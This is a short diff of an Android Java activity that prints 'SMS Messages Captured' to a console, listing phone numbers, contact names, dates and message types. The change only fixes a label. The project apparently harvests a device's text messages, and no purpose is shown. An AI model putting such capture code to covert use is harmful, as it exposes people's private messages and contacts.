@@ -91,7 +91,7 @@ public class console extends Activity{
 		if(smsList != null){
 			console.append("\n\nSMS Messages Captured...\n==========================\n\n");
 			for(int i=0;i<smsList.length;i++){
-				console.append("Phone #nice:\t"+smsList[i].getPhoneNumber()+"\n");
+				console.append("Phone #:\t"+smsList[i].getPhoneNumber()+"\n");
 				console.append("Name:\t"+smsList[i].getContactName()+"\n");
 				console.append("Date:\t"+smsList[i].getMessageDate()+"\n");
 				console.append("Type:\t"+smsList[i].getMessageType()+"\n");
